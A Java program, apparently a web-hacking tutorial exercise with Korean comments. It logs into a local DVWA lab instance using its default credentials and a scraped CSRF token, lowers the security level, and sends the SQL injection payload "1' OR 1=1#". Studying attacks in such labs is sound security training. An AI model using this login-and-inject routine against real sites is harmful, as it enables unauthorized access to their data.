package TrafficAnomalyDetection.FDS.WebHackingTutorial;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.*;

public class SQLInjectionTrial {
    private static final String BASE_URL = "http://192.168.219.103/DVWA";
    private static final String LOGIN_URL = BASE_URL + "/login.php";
    private static final String ATTACK_URL = BASE_URL + "/vulnerabilities/sqli/";
    private static String sessionCookie = null;
    private static String csrfToken = null;
    private static HttpURLConnection conn = null;

    public static void main(String[] args) throws Exception {
        SQLInjectionTrial trial = new SQLInjectionTrial();
        trial.run();
    }

    public void run() throws Exception {
        // 1️⃣ 로그인 및 세션 유지
        if (!login()) {
            System.out.println("로그인 실패! 공격 중단");
            return;
        }

        // 2️⃣ SQL Injection 공격 실행
        String payload = URLEncoder.encode("1' OR 1=1#", StandardCharsets.UTF_8) + "&Submit=Submit#";
        sendAttack(payload);
    }

 // ✅ 로그인 처리 (세션 유지)
    private boolean login() throws Exception {
        // 1️⃣ 로그인 페이지에서 CSRF 토큰 가져오기
        String loginPage = sendRequest(LOGIN_URL, "GET", null);
        csrfToken = extractCsrfToken(loginPage);
        if (csrfToken == null) {
            System.out.println("CSRF 토큰을 찾을 수 없습니다.");
            return false;
        }

        // 2️⃣ 로그인 요청 보내기
        String loginData = "username=admin&password=password&user_token=" + csrfToken + "&Login=Login";
        sendRequest(LOGIN_URL, "POST", loginData);

        // 3️⃣ 리디렉션 URL을 확인하여 로그인 성공 여부 판단
        Map<String, List<String>> headers = conn.getHeaderFields();
        System.out.println(headers);
        System.out.println(conn.getHeaderField("Set-Cookie"));
        
        String redirectUrl = conn.getHeaderField("Location");
        if (redirectUrl != null && redirectUrl.contains("/index.php")) {
            System.out.println("로그인 성공! 리디렉션 확인됨.");
            return true;
        }
        System.out.println("로그인 실패! 리디렉션 없음.");
        return false;
    }

    // ✅ SQL Injection 공격 요청
    private void sendAttack(String payload) throws Exception {
        String attackUrl = ATTACK_URL + "?id=" + payload;
        String response = sendRequest(attackUrl, "GET", null);
        System.out.println("공격 응답:");
        System.out.println(response);
    }

    // ✅ 요청을 처리하는 공통 메서드 (GET/POST 지원)
    private String sendRequest(String urlString, String method, String postData) throws Exception {
        URL url = new URL(urlString);
        conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod(method);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setRequestProperty("Accept", "text/html");
        
        // 🔥 기존 세션 쿠키 유지 (로그인 후 세션을 유지함)
        if (sessionCookie != null) {
            conn.setRequestProperty("Cookie", sessionCookie);
        }
        
     // ✅ 여기에서 로그인 요청 헤더 출력 (login.php 요청일 경우)
        if (urlString.contains("login.php")) {
            System.out.println("🔹 [로그인 요청] Request Headers:");
            conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));
//            conn.getRequestProperties();
        }
        
//        Map<String, List<String>> headers = conn.getHeaderFields();
//        System.out.println(headers);

        // 🔥 POST 요청 처리
        if ("POST".equals(method) && postData != null) {
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData.getBytes(StandardCharsets.UTF_8));
            }
        }

        // 🔥 응답 읽기
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

     // 🔥 로그인 후 쿠키 저장 (기존 세션 갱신)
        if (urlString.contains("login.php")) {
            Map<String, List<String>> headerFields = conn.getHeaderFields();
            List<String> cookies = headerFields.get("Set-Cookie");

            if (cookies != null) {
                for (String cookie : cookies) {
                    if (cookie.startsWith("PHPSESSID")) {  // ✅ 새로운 PHPSESSID 저장
                        String[] parts = cookie.split(";");
                        sessionCookie = parts[0] + "; security=low";  // ✅ 기존 security=low 유지
                        System.out.println("새로운 세션 쿠키 저장: " + sessionCookie);
                        break;
                    }
                }
            }
        }

        return response.toString();
    }

    // ✅ CSRF 토큰 추출 메서드
    private String extractCsrfToken(String response) {
        Pattern pattern = Pattern.compile("name='user_token' value='(.*?)'");
        Matcher matcher = pattern.matcher(response);
        return matcher.find() ? matcher.group(1) : null;
    }
}